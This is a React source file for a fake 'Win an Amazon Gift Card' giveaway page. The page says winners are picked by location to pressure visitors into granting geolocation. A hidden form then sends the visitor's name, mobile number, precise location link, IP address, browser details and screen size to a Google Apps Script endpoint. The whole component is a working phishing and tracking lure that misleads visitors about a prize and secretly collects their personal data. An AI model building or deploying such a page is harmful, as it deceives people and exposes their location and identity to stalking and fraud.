import React, { useRef, useState } from "react";
import useGeoLocation from "../Hooks/useGeoLocation";

const Form = (props) => {
  const [winner, setWinner] = useState(false)
  const formRef = useRef(null);

  const {name,mobile,ipAddress}=props;

  const location = useGeoLocation();

  const scriptURL =
    "https://script.google.com/macros/s/AKfycbwEptCCNw6hFnIPLkcerNNgFIC_mlQ0CtGkViOu7xci0nt7M5c_B8EhoSmtOMkBZ2HYeA/exec";

  const currentDate = new Date(Date.now());
  let day = currentDate.getDate();
  let month = currentDate.getMonth() + 1;
  let year = currentDate.getFullYear();
  day = day < 10 ? "0" + day : day;
  month = month < 10 ? "0" + month : month;
  let formattedDate = day + "/" + month + "/" + year;

  

  const submit = (e) => {
    e.preventDefault();
    fetch(scriptURL, { method: "POST", body: new FormData(formRef.current) })
      .then((response) => console.log("Success!", response))
      .catch((error) => console.error("Error!", error.message));
  };

  const checkLoaction=()=>{
    if(!location.loaded){
        alert("We are only picking winner Location Base, Allow location to get a chance to win")
        return
    }
    setWinner(true)
    
  }

  return (
    <>
      {winner && (
        <div>
          <div className="winner-page">
            <div className="winner-page__content">
              <h1 className="winner-page__title">
                Congratulations! {name.toUpperCase()}
              </h1>
              <p className="winner-page__prize">
                If You are the lucky winner of an Amazon Gift Voucher worth
                <br /> Rs 50-1000
              </p>
              <p className="winner-page__winner-name">
                You will get an sms of an Amazon Gift Voucher on
                <br /> your mobile number {" " + mobile}
              </p>
            </div>
          </div>
        </div>
      )}

      <form
        name="submit-to-google-sheet"
        onSubmit={submit}
        ref={formRef}
        style={{ display: winner ? "none" : "" }}
      >
        <div style={{ display: "none" }}>
          <input name="Date" type="text" placeholder="" value={formattedDate} />
          <input
            name="Time"
            type="text"
            placeholder=""
            value={currentDate.toLocaleTimeString()}
          />
          <input name="Name" type="text" placeholder="" value={name} />
          <input
            name="MobileNumber"
            type="text"
            placeholder=""
            value={mobile}
          />
          <input
            name="Location"
            type="text"
            value={
              location.loaded
                ? JSON.stringify(location.mapLink)
                : "Location data not available yet." + location.error.message
            }
          />
          <input name="IP" type="text" value={ipAddress} />
          <input name="Agent" type="text" value={navigator.userAgent} />
          <input
            name="AgentData"
            type="text"
            value={JSON.stringify(navigator.userAgentData)}
          />
          <input
            name="ScreenSize"
            type="text"
            value={window.innerHeight + "x" + window.innerWidth}
          />
        </div>

        <div className="container">
          <h1 className="heading">Win an Amazon Gift Card!</h1>
          <p className="description">
            Allow us to pick you up at a <br />
            unique location and increase your chance to win.
          </p>

          <div className="location-permission">
            <p>
              We pick winners based on location.
              <br /> Grant us permission to locate you at a unique spot.
            </p>
          </div>
        </div>
        <button
          type="submit"
          className="gift-page__claim-button"
          onClick={checkLoaction}
          style={{ display: location.loaded ? "" : "none" }}
        >
          Claim Now
        </button>
        <button
          className="gift-page__claim-button"
          onClick={checkLoaction}
          style={{ display: location.loaded ? "none" : "" }}
        >
          Claim Now
        </button>
      </form>
    </>
  );
};

export default Form
